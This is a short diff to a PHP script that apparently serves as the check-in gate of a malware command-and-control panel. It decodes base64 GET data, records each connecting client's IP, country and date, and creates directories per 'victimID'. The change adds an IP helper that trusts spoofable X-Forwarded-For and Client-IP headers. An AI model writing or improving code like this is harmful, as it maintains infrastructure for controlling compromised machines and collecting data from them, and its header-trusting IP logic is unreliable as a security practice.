@@ -1,10 +1,10 @@
 <?php
-include 'classes/Database.php';
-include 'classes/Clients.php';
+include_once 'classes/Database.php';
+include_once 'classes/Clients.php';
 
 $client = new Clients;
 
-$ipaddress = $_SERVER['REMOTE_ADDR'];
+$ipaddress = getUserIpAddr();
 $country = getConteryCode($ipaddress);
 $date = date("Y-m-d");
 $data = isset($_GET['data']) ? explode("|BN|", base64_decode($_GET['data'])) : '';
@@ -47,4 +47,18 @@ function new_dir($victimID){
   }
 
 }
+
+function getUserIpAddr(){
+    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+        //ip from share internet
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+        //ip pass from proxy
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }else{
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip;
+}
+
 ?>
